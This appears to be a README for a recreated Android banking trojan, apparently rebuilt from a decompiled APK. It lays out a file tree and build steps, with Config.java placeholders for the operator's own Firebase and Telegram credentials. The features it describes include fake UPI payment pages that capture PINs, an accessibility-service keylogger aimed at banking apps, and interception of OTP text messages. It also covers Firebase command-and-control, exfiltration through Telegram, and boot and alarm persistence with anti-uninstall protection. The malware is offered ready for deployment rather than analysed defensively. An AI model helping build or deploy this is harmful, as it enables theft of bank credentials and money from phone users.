# X VIDEO App - Source Code Structure

Organized source code recreation from decompiled APK analysis.

## Project Structure

```
x_source/
├── AndroidManifest.xml          # App manifest with permissions
├── build.gradle                 # Gradle build config
├── src/
│   ├── core/
│   │   ├── App.java            # Application class
│   │   └── Config.java         # Configuration constants
│   │
│   ├── accessibility/
│   │   └── KeyloggerService.java    # Accessibility service (keylogging)
│   │
│   ├── firebase/
│   │   └── FirebaseHelper.java      # Firebase database operations
│   │
│   ├── telegram/
│   │   └── TelegramHelper.java      # Telegram bot notifications
│   │
│   ├── sms/
│   │   └── SmsHelper.java           # SMS read/send operations
│   │
│   ├── service/
│   │   └── MainService.java         # Background foreground service
│   │
│   ├── receiver/
│   │   ├── SmsReceiver.java         # SMS broadcast receiver
│   │   ├── BootReceiver.java        # Boot completed receiver
│   │   └── AlarmReceiver.java       # Alarm receiver for persistence
│   │
│   ├── ui/
│   │   └── MainActivity.java        # Main activity with WebView
│   │
│   └── util/
│       ├── SharedPrefManager.java   # Shared preferences wrapper
│       ├── DeviceInfoUtil.java      # Device information utilities
│       ├── NetworkUtil.java         # Network status utilities
│       └── BatteryUtil.java         # Battery status utilities
│
├── res/
│   ├── layout/
│   │   └── activity_main.xml        # Main layout
│   ├── xml/
│   │   └── accessibility_config.xml # Accessibility service config
│   ├── values/
│   │   └── strings.xml              # String resources
│   └── drawable/                    # Icons
│
└── assets/
    ├── index.html                   # Landing page
    ├── method.html                  # Payment method selection
    ├── pin.html                     # UPI PIN capture page
    └── app.html                     # Main content page
```

## Features

### 1. UPI PIN Capture
- Fake payment flow: index.html → method.html → pin.html
- Captured PINs sent to Firebase and Telegram

### 2. Keylogging (AccessibilityService)
- Monitors all UPI/banking apps
- Captures PIN entries via text change events
- Anti-uninstall protection

### 3. SMS Interception
- Intercepts all incoming SMS
- Filters for OTP/banking messages
- Forwards to Firebase and optionally to phone number

### 4. Remote Commands (Firebase C2)
- Real-time command execution
- SMS forwarding control
- Send SMS remotely
- Permission checks

### 5. Telegram Notifications
- New device registration alerts
- SMS notifications
- Captured PIN alerts

### 6. Persistence
- Boot receiver auto-start
- Alarm-based service restart
- Foreground service with notification

## Configuration

Edit `src/core/Config.java`:

```java
// Firebase URL
public static final String FIREBASE_URL = "https://your-project.firebaseio.com";

// Telegram Bot
public static final String TELEGRAM_BOT_TOKEN = "your_bot_token";
public static final String TELEGRAM_CHAT_ID = "your_chat_id";
```

## Build Instructions

1. Set up Android Studio with SDK 21-33
2. Add `google-services.json` from Firebase console
3. Update Config.java with your credentials
4. Build APK: `./gradlew assembleRelease`

## Firebase Database Structure

```
clients/
  {device_id}/
    deviceId: string
    model: string
    android: string
    publicIP: string
    online: boolean
    permissions/
    keylogger/
      events/
      pins/
    commands/
      
sms_{device_id}/
  {timestamp}/
    sender: string
    body: string
    type: string
```

## Permissions Required

- INTERNET, ACCESS_NETWORK_STATE
- READ_SMS, RECEIVE_SMS, SEND_SMS
- CALL_PHONE, READ_PHONE_STATE
- RECEIVE_BOOT_COMPLETED
- FOREGROUND_SERVICE
- Accessibility Service

## Notes

- Target SDK 28 to avoid runtime permission issues
- Uses StringFog obfuscation in original APK
- WebView loads local HTML assets
- Device ID from ANDROID_ID
